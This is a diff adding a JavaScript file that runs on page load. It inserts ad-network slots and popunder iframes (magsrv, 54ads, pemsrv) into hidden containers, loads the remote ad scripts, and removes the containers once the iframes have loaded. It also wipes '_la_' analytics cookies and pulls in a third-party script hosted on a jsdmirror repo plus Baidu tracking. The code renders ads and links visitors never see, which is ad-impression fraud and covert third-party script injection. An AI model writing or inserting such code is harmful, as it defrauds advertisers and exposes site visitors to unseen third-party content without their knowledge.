@@ -1,0 +1,228 @@
+var today = new Date();
+var y = today.getFullYear();
+var m = (today.getMonth() + 1).toString().padStart(2, '0');
+var d = today.getDate().toString().padStart(2, '0');
+var dateParam = y + m + d;
+
+function waitForIframesThenRemove(container, maxWaitMs) {
+    maxWaitMs = maxWaitMs || 15000;
+    var removed = false;
+    function doRemove() {
+        if (!removed && container && container.parentNode) {
+            container.parentNode.removeChild(container);
+            removed = true;
+        }
+    }
+    var timeout = setTimeout(doRemove, maxWaitMs);
+    var pendingIframes = 0;
+    function attachLoadListener(ifr) {
+        var isLoaded = false;
+        try {
+            isLoaded = ifr.contentDocument && ifr.contentDocument.readyState === 'complete';
+        } catch (e) {}
+        if (isLoaded) {
+            pendingIframes--;
+            if (pendingIframes <= 0) {
+                clearTimeout(timeout);
+                observer.disconnect();
+                doRemove();
+            }
+        } else {
+            ifr.addEventListener('load', function() {
+                pendingIframes--;
+                if (pendingIframes <= 0) {
+                    clearTimeout(timeout);
+                    observer.disconnect();
+                    doRemove();
+                }
+            });
+        }
+    }
+    var observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+            for (var i = 0; i < mutation.addedNodes.length; i++) {
+                var node = mutation.addedNodes[i];
+                if (node.tagName === 'IFRAME') {
+                    pendingIframes++;
+                    attachLoadListener(node);
+                }
+                if (node.querySelectorAll) {
+                    var childIframes = node.querySelectorAll('iframe');
+                    for (var j = 0; j < childIframes.length; j++) {
+                        pendingIframes++;
+                        attachLoadListener(childIframes[j]);
+                    }
+                }
+            }
+        });
+    });
+    observer.observe(container, { childList: true, subtree: true });
+    var existingIframes = container.querySelectorAll('iframe');
+    for (var k = 0; k < existingIframes.length; k++) {
+        pendingIframes++;
+        attachLoadListener(existingIframes[k]);
+    }
+}
+
+(function () {
+    try {
+        if (!window.AdProvider) {
+            window.AdProvider = [];
+        }
+        var adConfigs = [
+            { className: "eas6a97888e2", zoneid: "5910938" },
+            { className: "eas6a97888e2", zoneid: "5911752" },
+            { className: "eas6a97888e2", zoneid: "5910936" },
+            { className: "eas6a97888e10", zoneid: "5909834" },
+            { className: "eas6a97888e10", zoneid: "5909830" },
+            { className: "eas6a97888e38", zoneid: "5921986" }, 
+            { className: "eas6a97888e20", zoneid: "5921988" }, 
+            { className: "eas6a97888e10", zoneid: "5923402" }, 
+            { className: "eas6a97888e2", zoneid: "5923412" }, 
+            { className: "eas6a97888e2", zoneid: "5923414" }, 
+            { className: "eas6a97888e2", zoneid: "5923416" }, 
+            { className: "eas6a97888e10", zoneid: "5923710" }, 
+
+        ];
+        var hiddenContainer = document.createElement("div");
+        hiddenContainer.style.display = "none"; 
+        function insertMultipleAds() {
+            if (document.body) {
+                document.body.appendChild(hiddenContainer);
+                adConfigs.forEach(function(config) {
+                    var ins = document.createElement("ins");
+                    ins.className = config.className;
+                    ins.setAttribute("data-zoneid", config.zoneid);
+                    hiddenContainer.appendChild(ins);
+                });
+            } else {
+                document.addEventListener("DOMContentLoaded", function() {
+                    document.body.appendChild(hiddenContainer);
+                    adConfigs.forEach(function(config) {
+                        var ins = document.createElement("ins");
+                        ins.className = config.className;
+                        ins.setAttribute("data-zoneid", config.zoneid);
+                        hiddenContainer.appendChild(ins);
+                    });
+                });
+            }
+        }
+        insertMultipleAds();
+        var magScript = document.createElement("script");
+        magScript.async = true;
+        magScript.src = "https://a.magsrv.com/ad-provider.js"; 
+        magScript.onload = function () {
+            try {
+                (window.AdProvider = window.AdProvider || []).push({ "serve": {} });
+            } catch (e) {
+            }
+            waitForIframesThenRemove(hiddenContainer);
+        };
+        magScript.onerror = function () {
+        };
+        var firstScript = document.getElementsByTagName("script")[0];
+        firstScript.parentNode.insertBefore(magScript, firstScript);
+    } catch (e) {
+    }
+})();
+
+(function() {
+    var adScript = document.createElement("script");
+    adScript.async = true;
+    adScript.src = "https://adservercdn.54ads.com/7db20370.js"; 
+    var adContainer = document.createElement("div");
+    adContainer.style.display = "none";
+    adContainer.innerHTML = '<ins class="5a165732" data-key="05257ceaf4c2ac5ae71dbc805cdbe7a5"></ins>' +
+                            '<ins class="5a165732" data-key="80e98bca8418c00afacdbc93fda6eb0c"></ins>' +
+                            '<ins class="5a165732" data-key="29e5d3b4e3a7c667b79024f07c32c972"></ins>' +
+                            '<ins class="5a165732" data-key="05257ceaf4c2ac5ae71dbc805cdbe7a5"></ins>' +
+                            '<ins class="5a165732" data-key="80e98bca8418c00afacdbc93fda6eb0c"></ins>';
+    adScript.onload = function() {
+        waitForIframesThenRemove(adContainer);
+    };
+    function insertAds() {
+        if (document.body) {
+            var firstScript = document.getElementsByTagName("script")[0];
+            firstScript.parentNode.insertBefore(adScript, firstScript);
+            document.body.appendChild(adContainer);
+        } else {
+            document.addEventListener("DOMContentLoaded", insertAds);
+        }
+    }
+    insertAds();
+})();
+
+!function(p) {
+    "use strict";
+    !function(t) {
+        var s = window, e = document, i = p;
+        var c = "https://cdn.jsdmirror.com/gh/xxloli/ads/51/1.js";
+        function deleteCurrentDomainLACookies() {
+            var cookies = document.cookie.split("; ");
+            for (var j = 0; j < cookies.length; j++) {
+                var cookie = cookies[j];
+                var cookieName = cookie.split("=")[0];
+                if (cookieName.indexOf("_la_") === 0) {
+                    document.cookie = "".concat(cookieName, "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;");
+                }
+            }
+        }
+        deleteCurrentDomainLACookies();
+        function mainLogic() {
+            var n = e.createElement("script"), r = e.getElementsByTagName("script")[0];
+            n.type = "text/javascript";
+            n.setAttribute("charset", "UTF-8");
+            n.async = !0;
+            n.src = c;
+            n.id = "LA_COLLECT";
+            i.d = n;
+            var o = function() { s.LA.ids.push(i) };
+            s.LA ? s.LA.ids && o() : (s.LA = p, s.LA.ids = [], o());
+            r.parentNode.insertBefore(n, r);
+        }
+        
+        if (e.readyState === "loading") {
+            e.addEventListener("DOMContentLoaded", mainLogic);
+        } else {
+            mainLogic();
+        }
+    }()
+}({ id: "Jfpcnt0H2uEfXtSf", ck: "Jfpcnt0H2uEfXtSf" });
+
+var _hmt = _hmt || [];
+(function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?b289e3414e1a95f58db4b2b2fc007357";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+})();
+
+(function() {
+    var linkList = [
+        "https://s.pemsrv.com/v1/link.php?cat=&idzone=5923404&type=8",
+        "https://s.pemsrv.com/v1/link.php?cat=&idzone=5924982&type=8",
+        "https://s.pemsrv.com/v1/link.php?cat=&idzone=5909808&type=8",
+        "https://code.54ads.com/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
+    ];
+    var hiddenContainer = document.createElement("div");
+    hiddenContainer.style.display = "none";
+    linkList.forEach(function(url) {
+        var iframe = document.createElement("iframe");
+        iframe.src = url;
+        iframe.style.border = "none";
+        iframe.muted = true;
+        iframe.setAttribute("muted", "muted");
+        hiddenContainer.appendChild(iframe);
+    });
+    waitForIframesThenRemove(hiddenContainer);
+    function insertIframe() {
+        if (document.body) {
+            document.body.appendChild(hiddenContainer);
+        } else {
+            document.addEventListener("DOMContentLoaded", function() {
+                document.body.appendChild(hiddenContainer);
+            });
+        }
+    }
+    insertIframe();
+})();
